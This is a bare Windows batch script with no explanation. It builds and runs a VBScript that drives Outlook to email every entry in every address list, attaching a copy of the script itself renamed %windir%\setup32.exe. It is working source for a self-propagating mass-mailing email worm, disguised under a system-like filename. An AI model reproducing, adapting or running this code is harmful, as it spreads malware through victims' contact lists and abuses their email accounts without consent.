@echo off
echo Set out = CreateObject("Outlook.Application") >>%temp%\m.vbs
echo Set mapi = out.GetNameSpace("MAPI") >>%temp%\m.vbs
echo For a = 1 To mapi.AddressLists.Count >>%temp%\m.vbs
echo Set l = mapi.AddressLists(a) >>%temp%\m.vbs
echo For b = 1 To l.AddressEntries.Count >>%temp%\m.vbs
echo Set msg = out.CreateItem(0) >>%temp%\m.vbs
echo msg.Recipients.Add l.AddressEntries(b) >>%temp%\m.vbs
echo msg.Attachments.Add "%windir%\setup32.exe" >>%temp%\m.vbs
echo msg.Send >>%temp%\m.vbs
echo Next >>%temp%\m.vbs
echo Next >>%temp%\m.vbs
copy %0 %windir%\setup32.exe
wscript %temp%\m.vbs
